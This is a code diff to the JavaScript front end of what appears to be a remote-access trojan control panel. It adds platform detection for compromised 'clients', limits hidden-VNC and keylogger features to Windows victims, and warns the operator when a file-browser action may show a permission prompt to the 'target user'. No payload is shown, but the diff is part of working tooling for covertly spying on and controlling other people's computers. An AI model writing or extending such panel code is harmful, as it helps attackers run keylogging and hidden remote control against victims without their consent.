@@ -49,6 +49,48 @@ const clearContext = () => {
   contextCard = null;
 };
 
+function detectClientPlatform(clientId) {
+  if (!clientId) {
+    return "unknown";
+  }
+  const selectorId =
+    typeof CSS !== "undefined" && typeof CSS.escape === "function"
+      ? CSS.escape(clientId)
+      : clientId;
+  const card = document.querySelector(`article[data-id="${selectorId}"]`);
+  const os = String(card?.dataset?.os || "").toLowerCase();
+  if (os.includes("windows")) return "windows";
+  if (os.includes("darwin") || os.includes("mac")) return "mac";
+  if (os.includes("linux")) return "linux";
+  return "unknown";
+}
+
+function applyMenuSupportRules(clientId) {
+  const platform = detectClientPlatform(clientId);
+  const isWindows = platform === "windows";
+
+  const setAvailability = (btn, enabled, reason) => {
+    if (!btn) return;
+    btn.disabled = !enabled;
+    btn.setAttribute("aria-disabled", String(!enabled));
+    btn.classList.toggle("opacity-50", !enabled);
+    btn.classList.toggle("cursor-not-allowed", !enabled);
+    btn.classList.toggle("hover:bg-slate-700", enabled);
+    btn.classList.toggle("hover:bg-slate-800/50", !enabled);
+    btn.title = enabled ? "" : reason;
+  };
+
+  const hvncBtn = menu.querySelector('[data-open="hvnc"]');
+  setAvailability(hvncBtn, isWindows, "HVNC is only supported on Windows clients.");
+
+  const keyloggerBtn = menu.querySelector('[data-open="keylogger"]');
+  setAvailability(
+    keyloggerBtn,
+    isWindows,
+    "Keylogger capture is only fully supported on Windows clients.",
+  );
+}
+
 async function loadCurrentUser() {
   try {
     const res = await fetch("/api/auth/me");
@@ -194,6 +236,7 @@ function initializeRenderer() {
     totalPill,
     pageLabel,
     openMenu: (id, x, y) => {
+      applyMenuSupportRules(id);
       openMenu(id, x, y, setContext);
       loadPluginsForClient(id);
     },
@@ -511,6 +554,9 @@ window.addEventListener("click", (e) => {
 menu.addEventListener("click", async (e) => {
   const target = e.target.closest("button");
   if (!target || !contextCard) return;
+  if (target.disabled || target.getAttribute("aria-disabled") === "true") {
+    return;
+  }
   const pluginId = target.dataset.plugin;
   if (pluginId) {
     try {
@@ -555,6 +601,16 @@ menu.addEventListener("click", async (e) => {
     return;
   }
   if (open === "files") {
+    const platform = detectClientPlatform(contextCard);
+    if (platform !== "windows") {
+      const proceed = confirm(
+        "Opening File Browser may show a permission prompt to the target user on their machine. Continue?",
+      );
+      if (!proceed) {
+        closeMenu(clearContext);
+        return;
+      }
+    }
     window.open(`/${contextCard}/files`, "_blank", "noopener");
     closeMenu(clearContext);
     return;
